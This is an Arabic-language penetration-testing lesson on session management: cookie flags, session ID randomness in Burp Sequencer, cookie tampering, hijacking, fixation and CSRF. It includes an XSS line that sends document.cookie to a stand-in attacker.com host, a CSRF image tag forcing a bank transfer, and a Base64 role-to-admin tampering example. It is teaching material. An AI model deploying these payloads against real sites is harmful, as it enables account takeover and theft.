# Session Management Testing — Cookie Tampering & Session Hijacking & Session Fixation

---

## الصورة الكبيرة — ليه الـ Session Management مهم؟

اتكلمنا في المحاضرة إن الـ HTTP بطبعه **Stateless** (بلا حالة) — يعني كل request مستقل والسيرفر مش بيتذكر مين بعته.

الـ **Session Management** (إدارة الجلسات) هو الحل اللي بيخلي السيرفر يعرف إنك نفس الشخص اللي عمل login من شوية.

لما تـ login — السيرفر بيعمل **Session ID** (معرّف الجلسة) — رقم فريد — وبيبعته في **Cookie** للـ browser. من دلوقتي كل request بيبعت الـ Cookie دي تلقائياً.

> الفكرة الجوهرية: لو حد سرق أو لاعب في الـ Session ID ده — هيقدر يتظاهر إنه إنت من غير ما يعرف الـ password.

---

## في الـ Pentest Methodology — جاي بعد إيه؟

```
[Authentication Testing] → [Session Management Testing] → [Authorization Testing]
       ✅ خلصنا                      ↑ إحنا هنا
```

بعد ما كسرت الـ Authentication — بتبص على الـ Sessions عشان تشوف تقدر تسرقها أو تتلاعب فيها.

---

## أولاً — Cookie Analysis (تحليل الـ Cookies)

### إزاي تشوف الـ Cookies في Burp؟

كل response من السيرفر بعد الـ login بيبعت الـ Cookie في الـ header كده:

```http
HTTP/1.1 200 OK
Set-Cookie: session_id=aB3xK9mZ2qR7; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
```

في Burp — بتشوف كل الـ Cookies في: **Proxy → HTTP History → اختار الـ request → Response tab**

### الـ Cookie Flags اللي بتبص عليهم:

|الـ Flag|موجود؟|المعنى|
|---|---|---|
|**HttpOnly**|✅ آمن|JavaScript مش يقدر يوصله — بيمنع XSS Cookie theft|
|**Secure**|✅ آمن|بيتبعت على HTTPS بس|
|**SameSite**|✅ آمن|بيمنع CSRF|
|**HttpOnly غايب**|❌ ثغرة|XSS تقدر تسرق الـ Cookie|
|**Secure غايب**|❌ ثغرة|الـ Cookie بتتبعت على HTTP عادي|

### إزاي تشوف الـ Flags في Burp؟

```http
Set-Cookie: session=abc123
```

لو مفيش `HttpOnly` بعد الـ session value — ده علامة على ثغرة.

---

## ثانياً — Session ID Analysis (تحليل قوة الـ Session ID)

### إيه اللي بنبص عليه؟

**1 — الطول:** الـ Session ID القصير سهل يتخمّن — المفروض يكون على الأقل 128 bit.

**2 — الـ Randomness (العشوائية):** لو الـ Session IDs متسلسلة أو فيها pattern — ممكن تتخمّن.

**مثال على Session IDs ضعيفة:**

```
session=1001
session=1002
session=1003
```

واضح إنها متسلسلة — الـ attacker يقدر يجرب كل الأرقام.

**مثال على Session ID قوي:**

```
session=aB3xK9mZ2qR7wN5pL8cF1hJ4vD6tE0
```

طويل وعشوائي — مش ممكن يتخمّن.

### إزاي تختبر الـ Randomness في Burp؟

**Burp Sequencer** — النطق: **سيكوينسر** — هو الـ tool في Burp المتخصص في تحليل عشوائية الـ tokens.

**الخطوات:**

1. في الـ HTTP History — ابعت الـ login response للـ Sequencer: كليك يمين → **Send to Sequencer**
2. في الـ Sequencer — حدد الـ Cookie اللي فيها الـ Session ID
3. اضغط **Start live capture** — Burp هيجمع مئات الـ Session IDs
4. اضغط **Analyze** — هيديك تقرير عن مستوى العشوائية

لو النتيجة **"poor randomness"** — ده معناه الـ Session IDs ممكن تتخمّن.

---

## ثالثاً — Cookie Tampering (التلاعب بالـ Cookie)

### الفكرة:

بناخد الـ Cookie ونحللها — لو فيها قيم زي `role=user` أو `isAdmin=false` نحاول نغيرها.

### إزاي نعمل Base64 Decode للـ Cookie؟

كتير من الـ Cookies بتكون **Base64 encoded** (مشفرة بـ Base64) — النطق: **بيس-سيكستي-فور إنكوديد** — يعني مش مشفرة حقيقي، بس متحولة لـ text مش قابل للقراءة.

**في Burp — Decoder tab:**

1. الصق الـ Cookie value
2. اختار **Decode as Base64**
3. شوف إيه جوا

**مثال:**

```
Cookie: user=eyJyb2xlIjoidXNlciIsImlkIjo1fQ==
```

بعد Base64 Decode:

```json
{"role":"user","id":5}
```

دلوقتي غير `role` لـ `admin` → اعمل Base64 Encode تاني → حط الـ Cookie الجديدة في الـ request → لو السيرفر مش بيتحقق → دخلت كـ admin!

---

## رابعاً — Session Hijacking (اختطاف الجلسة)

### الفكرة:

الـ **Session Hijacking** — النطق: **سيشن هاي-جاكينج** — يعني إنك بتسرق الـ Session ID بتاع user تاني وبتستخدمه عشان تتظاهر إنه هو.

### طرق السرقة:

**1 — XSS (Cross-Site Scripting):**
لو الـ Cookie مش عندها `HttpOnly` — ممكن تحقن JavaScript يسرق الـ Cookie:

```javascript
document.location='http://attacker.com/steal?cookie='+document.cookie
```

الـ victim بيزور الصفحة → الـ JavaScript بيتنفذ → الـ Cookie بتتبعت للـ attacker.

**2 — Network Sniffing (تشمم الشبكة):** 
لو الـ Cookie مش عندها `Secure` flag — بتتبعت على HTTP — الـ attacker على نفس الشبكة يقدر يقراها بـ **Wireshark** (وايرشارك) أو أي network sniffer.

**3 — Predictable Session IDs:**
لو الـ IDs ضعيفة — الـ attacker يجرب IDs كتير لحد ما يلاقي valid session.

### إزاي تستخدم الـ Hijacked Session في Burp؟

1. امسك أي request من الـ target
2. في الـ Cookie header — غير الـ Session ID بالـ ID المسروق
3. ابعت الـ request في الـ Repeater
4. لو الـ response رجع بـ data بتاع الـ user التاني → نجحت!

---

## خامساً — Session Fixation (تثبيت الجلسة)

### الفكرة:

الـ **Session Fixation** — النطق: **سيشن فيكسيشن** — مختلف عن الـ Hijacking.

- **Hijacking:** 
-بيحصل **بعد** الـ login — بتسرق session موجودة
- **Fixation:** 
- بيحصل **قبل** الـ login — بتحدد الـ Session ID قبل ما الـ user يـ login

### إزاي بيشتغل؟

**الخطوة 1:** الـ attacker بياخد Session ID من الموقع:

```
http://target.com/login
→ Set-Cookie: session=ATTACKER_KNOWN_ID
```

**الخطوة 2:** بيبعت link للـ victim بالـ Session ID ده:

```
http://target.com/login?sessionid=ATTACKER_KNOWN_ID
```

**الخطوة 3:** الـ victim بيفتح الـ link ويـ login.

**الخطوة 4:** لو الـ app مش بيـ **regenerate** (يجدد) الـ Session ID بعد الـ login — الـ attacker عنده نفس الـ ID اللي الـ victim بيستخدمه دلوقتي!

**الخطوة 5:** الـ attacker بيستخدم الـ Session ID ويدخل على الـ account.

### إزاي تختبر Session Fixation في Burp؟

**الخطوة 1:** قبل الـ login، امسك الـ GET request للـ login page وشوف الـ Session ID في الـ Cookie.

**الخطوة 2:** عمل login وامسك الـ POST request والـ response.

**الخطوة 3:** قارن الـ Session ID قبل وبعد الـ login.

```
قبل الـ login:  session=OLD_ID_123
بعد الـ login:  session=OLD_ID_123   ← نفس الـ ID! ثغرة Fixation موجودة
بعد الـ login:  session=NEW_ID_456   ← ID جديد! تمام — مش vulnerable
```

لو نفس الـ ID → الـ app مش بيـ regenerate → Session Fixation vulnerability.

---

## سادساً — CSRF (Cross-Site Request Forgery)

### الفكرة:

الـ **CSRF** — النطق: **سي-إس-آر-إف** — بيخلي الـ victim ينفذ request على موقع تاني من غير ما يعرف.

**الفرق الجوهري:**

- **Session Hijacking:**
- الـ attacker بيسرق الـ session ويستخدمها هو
- **CSRF:** 
- الـ attacker بيخلي الـ victim نفسه ينفذ الـ action من غير ما يعرف

### إزاي بيشتغل؟

**السيناريو:**

1. الـ victim logged in على `bank.com`
2. الـ attacker بيبعتله email فيه link أو صفحة HTML:

```html
<img src="http://bank.com/transfer?amount=5000&to=attacker_account" width="0" height="0">
```

3. الـ browser بيحمّل الـ image → بيبعت GET request لـ `bank.com` تلقائياً مع الـ session cookie
4. الـ bank بيشوف الـ request جاي من browser فيه valid session → بينفذه!
5. الفلوس بتتحول من غير ما الـ victim يعرف

### إزاي تختبر CSRF في Burp؟

**الخطوة 1:** امسك الـ request اللي بيعمل action مهم — زي تغيير email أو تحويل فلوس.

**الخطوة 2:** في Burp — كليك يمين على الـ request → **Engagement tools → Generate CSRF PoC**

الـ **PoC** — اختصار لـ **Proof of Concept** — النطق: **بي-أو-سي** — يعني دليل إثبات الثغرة.

Burp هيعمل HTML page تلقائياً فيها الـ CSRF attack.

**الخطوة 3:** افتح الـ HTML page في browser وأنت logged in على الـ target — لو الـ action اتنفذ → الـ app vulnerable لـ CSRF.

### علامات إن الـ app محمي من CSRF:

```http
POST /transfer HTTP/1.1

amount=5000&to=account&csrf_token=xK9mZ2qR7wN5pL8c
```

الـ **CSRF Token** — النطق: **سي-إس-آر-إف توكن** — هو قيمة عشوائية بيولدها السيرفر لكل request. لو مش موجودة في الـ request → السيرفر بيرفضه.

لو مفيش `csrf_token` في الـ request → الـ app vulnerable.

---

## Session Testing Checklist (قايمة اختبار الـ Session)

```
□ الـ Cookie فيها HttpOnly؟
□ الـ Cookie فيها Secure؟
□ الـ Cookie فيها SameSite؟
□ الـ Session ID طويل وعشوائي؟ (اختبر بـ Sequencer)
□ الـ Session ID بيتغير بعد الـ login؟ (Session Fixation)
□ الـ Session ID بيتحذف بعد الـ logout؟
□ الـ Cookie فيها قيم قابلة للتعديل؟ (Base64 decode وشوف)
□ الـ app عنده CSRF Protection؟ (دور على csrf_token في الـ requests)
□ الـ Session بتـ expire بعد فترة؟
```

---

## مصطلحات الدرس

|English Term|المعنى|النطق|
|---|---|---|
|Session Management|إدارة الجلسات|سيشن مانيجمنت|
|Stateless|بلا حالة — HTTP مش بيتذكر|ستيتليس|
|Session ID|معرف الجلسة الفريد|—|
|Cookie Tampering|التلاعب بالـ Cookie|—|
|Base64 Encoding|ترميز النصوص والبيانات|بيس-سيكستي-فور إنكوديد|
|Session Hijacking|اختطاف الجلسة|سيشن هاي-جاكينج|
|Session Fixation|تثبيت الجلسة|سيشن فيكسيشن|
|Regenerate|تجديد الـ Session ID بعد الـ login|ريجينيريت|
|CSRF|تزوير الطلبات عبر المواقع|سي-إس-آر-إف|
|CSRF Token|رمز حماية عشوائي ضد CSRF|سي-إس-آر-إف توكن|
|Proof of Concept|دليل إثبات الثغرة|بي-أو-سي|
|Burp Sequencer|أداة تحليل عشوائية الـ tokens|سيكوينسر|
|Network Sniffing|تشمم حركة الشبكة|نيتورك سنيفنج|
|Wireshark|أداة تحليل الشبكة|وايرشارك|
|Randomness|العشوائية|راندمنيس|
|HttpOnly|flag بيمنع JavaScript من قراءة الـ Cookie|إتش-تي-تي-بي أونلي|

---

## ملخص الفكرة العملية

> الـ Session Management Testing بيدور على سؤال واحد: **هل الـ app بيحمي الـ Session ID كويس؟** بتبص على الـ Cookie Flags — لو مفيش HttpOnly أو Secure → ثغرة. بتحلل الـ Session ID بالـ Sequencer — لو ضعيف → ممكن يتخمّن. بتعمل Base64 Decode للـ Cookie — لو فيها قيم زي role أو isAdmin → جرب تغيرها. بتختبر Session Fixation — لو الـ ID مش بيتغير بعد الـ login → ثغرة. وبتدور على CSRF — لو مفيش csrf_token في الـ sensitive requests → ثغرة.

---

**الخطوة الجاية:** JWT Attacks — إزاي تحلل الـ Token وتستغل ثغرة الـ None Algorithm.

نكمل؟